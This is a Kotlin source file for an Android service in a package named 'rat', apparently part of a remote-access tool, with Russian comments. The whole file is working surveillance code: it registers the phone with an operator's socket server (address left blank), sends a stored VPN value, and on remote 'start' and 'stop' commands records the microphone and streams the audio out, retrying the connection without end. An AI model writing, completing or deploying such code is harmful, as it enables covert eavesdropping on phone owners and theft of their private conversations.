package com.example.rat

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.socket.client.IO
import io.socket.client.Socket
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean

class AudioStreamingService : Service() {

    private var socket: Socket? = null
    private var isRecording = AtomicBoolean(false)
    private var audioRecord: AudioRecord? = null
    private val handler = Handler(Looper.getMainLooper())
    private var retryCount = 0

    private val TAG = "AudioStreamingService"
    private lateinit var deviceUUID: String

    // Ключ для SharedPreferences и для хранения VPN-номера.
    private val DEVICE_UUID_KEY = "device_uuid"

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()

        // Проверяем, есть ли уже сохраненный UUID, если нет - генерируем новый.
        val sharedPreferences = getSharedPreferences("MyPrefs", MODE_PRIVATE)
        deviceUUID = sharedPreferences.getString(DEVICE_UUID_KEY, null) ?: UUID.randomUUID().toString()

        if (sharedPreferences.getString(DEVICE_UUID_KEY, null) == null) {
            sharedPreferences.edit().putString(DEVICE_UUID_KEY, deviceUUID).apply()
        }

        Log.d(TAG, "AudioStreamingService created with UUID: $deviceUUID")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = getNotification()
        startForeground(1, notification)

        // Отложенная инициализация соединения с сервером.
        handler.postDelayed({ initializeSocketConnection() }, INIT_DELAY)

        return START_STICKY
    }

    private fun initializeSocketConnection() {
        if (checkPermission()) {
            connectToServer()
        } else {
            Log.e(TAG, "No permission to record audio")
            stopSelf()
        }
    }

    private fun connectToServer() {
        try {
            if (socket == null) {
                socket = IO.socket("http://") // Yr server address

                socket?.on(Socket.EVENT_CONNECT) {
                    Log.d(TAG, "Connected to server")
                    retryCount = 0

                    // Регистрация устройства с UUID на сервере.
                    socket?.emit("register", deviceUUID)

                    // Получаем VPN из SharedPreferences.
                    val sharedPreferences = getSharedPreferences("MyPrefs", MODE_PRIVATE)
                    val vpn = sharedPreferences.getString("VPN_KEY", null)

                    if (vpn != null) {
                        // Отправляем VPN на сервер.
                        socket?.emit("vpn", vpn)
                        Log.d(TAG, "VPN успешно отправлен на сервер: $vpn")
                    } else {
                        Log.e(TAG, "VPN не найден в SharedPreferences")
                    }
                }

                socket?.on(Socket.EVENT_CONNECT_ERROR) { args ->
                    Log.e(TAG, "Connection error: ${args[0]}")
                    retryConnection()
                }

                socket?.on("start") {
                    Log.d(TAG, "Start command received from server.")
                    startRecording()
                }

                socket?.on("stop") {
                    Log.d(TAG, "Stop command received from server.")
                    stopRecording()
                }

                socket?.connect() // Подключаемся к серверу.
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error connecting to server", e)
            retryConnection()
        }
    }

    private fun retryConnection() {
        handler.postDelayed({
            connectToServer()
            retryCount++
            Log.d(TAG, "Retrying connection... Attempt #$retryCount")
        }, 5000) // Повторная попытка через 5 секунд до бесконечности.
    }

    private fun checkPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    private fun startRecording() {
        if (isRecording.get()) return

        try {
            val bufferSize = AudioRecord.getMinBufferSize(
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            )

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )

            if (audioRecord?.state == AudioRecord.STATE_INITIALIZED) {
                isRecording.set(true)
                Log.d(TAG, "Recording started.")

                audioRecord?.startRecording()
                Thread { recordAudio() }.start()
            } else {
                Log.e(TAG, "AudioRecord initialization failed")
                releaseAudioRecord()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error starting recording", e)
            releaseAudioRecord()
        }
    }

    private fun recordAudio() {
        val audioData = ByteArray(BUFFER_SIZE)
        while (isRecording.get()) {
            val read = audioRecord?.read(audioData, 0, audioData.size) ?: -1
            if (read > 0) {
                Log.d(TAG, "Sending audio data to server")
                socket?.emit("audio", audioData)
            }
        }
    }

    private fun stopRecording() {
        if (!isRecording.get()) return

        isRecording.set(false)
        audioRecord?.stop()
        releaseAudioRecord()
        Log.d(TAG, "Recording stopped.")
    }

    private fun releaseAudioRecord() {
        audioRecord?.release()
        audioRecord = null
    }

    override fun onDestroy() {
        stopRecording()
        socket?.disconnect() // Отключаем сокет при завершении сервиса.
        super.onDestroy()
        Log.d(TAG, "AudioStreamingService destroyed")
    }

    override fun onBind(p0: Intent?): IBinder? {
        return null // Сервис не связан с компонентами.
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Audio Streaming Service",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun getNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Audio Streaming")
            .setContentText("Streaming audio in the background")
            .setContentIntent(pendingIntent)
            .build()
    }

    companion object {
        private const val TAG = "AudioStreamingService"
        private const val CHANNEL_ID = "AudioStreamingServiceChannel"
        private const val SAMPLE_RATE = 44100 // Частота дискретизации в Гц.
        private const val BUFFER_SIZE = 4096 // Размер буфера для аудио.
        private const val INIT_DELAY = 5000L // Задержка инициализации в миллисекундах.
    }
}